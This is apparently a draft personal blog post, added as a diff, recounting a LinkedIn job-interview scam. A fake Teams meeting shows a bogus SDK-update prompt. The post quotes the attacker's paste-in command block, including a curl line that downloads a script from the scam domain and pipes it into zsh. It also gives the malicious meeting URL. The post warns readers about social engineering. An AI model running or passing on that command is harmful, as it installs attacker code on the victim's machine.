@@ -1,0 +1,58 @@
+---
+title: 'I almost got hacked'
+date: '2026-08-01'
+status: 'draft'
+tag: 'career'
+---
+
+
+So, I almost got hacked. This gets funnier everytime I remember it because of how it all played out.
+
+Earlier in the week, someone reached out to me on linkedIn, Paul. Paul's a CTO of an healthcare startup using AI for some really cool stuff.
+
+Now, Paul says he wants to have an intro chat because they are hiring developers with AI backgrounds to help streamline operations. I think it's interesting and schedule a call for the next day. It's calendly so looks legit enough and it sends me a follow up email after. Everything seems to be working as expected.
+
+In the confirmation email, there is no meeting link, it shows "Microsoft teams" as the location. I think it's unusual but I don't pay too much attention. Mostly because I was occupied with so much work. First flag.
+
+The meeting day arrives, Tuesday 2.pm. I try to join in early ahead of time, and notice that there is no meeting link. Strange but not unusual. Now, it's time for the meeting, 3min past actually and I'm fretting a bit cause I'm late, I really don't like being late. I send Paul a message saying I can't find the link. No acknowledgement, he just sends the link directly.
+
+This is it: https://teams.uslinecall.com/meet/9732414253?pwd=d6dpEwHdJab8PqB6be7KoVJksSgcWW.
+
+Now maybe if I was familiar with Teams, I could have spotted it right away but I've never used teams in my career and that looked legitimate enough. I also was a bit preoccupied to actually notice the structure of the url.
+
+I join in quickly as I'm 5min late, see the preview screen, test video, audio, looks good. It takes quite a bit to be let in but after 2extra minutes, I'm in.
+
+The first thing I see is this popup:
+
+![SDK update](/images/sketchy-update.png)
+
+Now, at this point, alarms start to go off. Not too loudly though. I just feel uneas. I've never seen anything like this with zoom or meet. Honestly, I still wasn't sure at this point. It was more strange than malicious. The one thing I was sure: I didn't have teams on my computer. If so, why do I need to update the SDK? Another flag.
+
+But, even with those concerns, I click the button and then this shows up and alarms go off.
+
+```
+set MEETING_ROOM="9732414253"
+set AUTH_API_TOKEN="Ya29.sInR16IkNiI5cCIpX.MzUxNDI1NzQ3xOA"
+set MEETING_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.9732414253.signature"
+curl -s https://teams.uslinecall.com/api/update/9732414253/3 | zsh
+set MEETING_SDK_VERSION="v5.17.5.4569"
+set UPDATE_METHOD="manual"
+softwareupdate --evaluate-products --products teams-meet-sdk --agree-to-license
+```
+
+This is sketchy, very very sketchy. I message Paul to ask him about the commands and he says it's audio issues, regular stuff, I just need to paste the commands, update the SDK and it will be all good. Sure, all good but not for me.
+
+<Notes>maybe this jump is a bit too sudden</Notes>
+I wasn't gonna be pasting any strange commands on my computer. After figuring it out, I take them for a ride before revealing that I was aware of the entire ruse. He blocks me after.
+
+Now, I am gonna be honest: I could have fallen for this if this happned a couple months ago. But somehow, fortune and circumstance just worked in my favour.
+
+A couple of months back, a friend informed me about this same style of attack and told me to be on the lookout from another LinkedIn hacker. Not Paul, someone else. 
+
+I also happened to read about open-source contributors who fell for the same pattern. It was mostly a skim but it was just lodged in my mind as this thing vector that exists out there.
+
+Finally, I read a couple of pages of Pro Bash which made me more sensitive to `curl` and what it does.
+
+So, really, I got lucky. Very lucky and I am glad to have overcome this.
+
+Social engineering is a really neat trick of worming one's way unto sensitive systems and hopefully this helps you mentally prepare for it, if or when it shows up.
